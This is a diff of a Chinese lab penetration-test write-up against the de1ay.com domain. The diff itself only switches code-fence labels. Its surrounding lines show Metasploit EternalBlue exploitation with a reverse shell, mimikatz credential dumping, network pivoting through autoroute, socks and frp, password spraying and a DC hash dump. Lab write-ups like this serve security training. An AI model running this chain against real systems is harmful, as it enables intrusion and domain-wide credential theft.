@@ -218,7 +218,7 @@ start vulscan
 
 尝试直接进行永恒之蓝攻击
 
-```shell
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 [*] Started reverse TCP handler on 192.168.200.129:4444
@@ -275,7 +275,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 所以采用迁移进程的方式进行提权
 
-```shell
+```bash
 meterpreter > ps
 
 Process List
@@ -346,7 +346,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 成功提权之后，就可以借助 mimikatz 搜集域内信息
 
-```shell
+```bash
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x86/windows)
@@ -374,7 +374,7 @@ mssql          DE1AY   1qaz@WSX
 
 得到凭据之后，就可以登录远程桌面
 
-```shell
+```bash
 xfreerdp /u:"administrator" /d:"de1ay.com" /v:192.168.200.80:3389
 ```
 
@@ -384,7 +384,7 @@ xfreerdp /u:"administrator" /d:"de1ay.com" /v:192.168.200.80:3389
 
 查看网卡信息
 
-```shell
+```bash
 meterpreter > ipconfig
 ......
 Interface 11
@@ -410,7 +410,7 @@ IPv6 Netmask : ffff:ffff:ffff:ffff::
 
 做转发
 
-```shell
+```bash
 meterpreter > run autoroute -s 10.10.10.0/24
 
 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
@@ -433,7 +433,7 @@ Active Routing Table
 
 启动 socks 监听
 
-```shell
+```bash
 meterpreter > bg
 [*] Backgrounding session 1...
 msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
@@ -447,7 +447,7 @@ msf6 auxiliary(server/socks_proxy) >
 
 ### fscan 扫描
 
-```shell
+```bash
 10.10.10.86:22 open
 10.10.10.241:22 open
 10.10.10.86:21 open
@@ -488,7 +488,7 @@ plugin = socks5
 bind_port = 10000
 ```
 
-```shell
+```bash
 C:\newDir>frpc.exe -c frpc.ini
 frpc.exe -c frpc.ini
 WARNING: ini format is deprecated and the support will be removed in the future, please use yaml/json/toml format instead!
@@ -512,7 +512,7 @@ WARNING: ini format is deprecated and the support will be removed in the future,
 
 ### 密码喷洒
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q crackmapexec smb 10.10.10.0/24 -u administrator -p 1qaz@WSX
 SMB         10.10.10.10     445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:de1ay.com) (signing:True) (SMBv1:True)
@@ -529,7 +529,7 @@ SMB         10.10.10.201    445    PC               [+] de1ay.com\administrator:
 
 ## 抓取域内哈希信息
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q impacket-secretsdump de1ay.com/administrator:1qaz@WSX@10.10.10.10 -just-dc
 Impacket v0.11.0 - Copyright 2023 Fortra
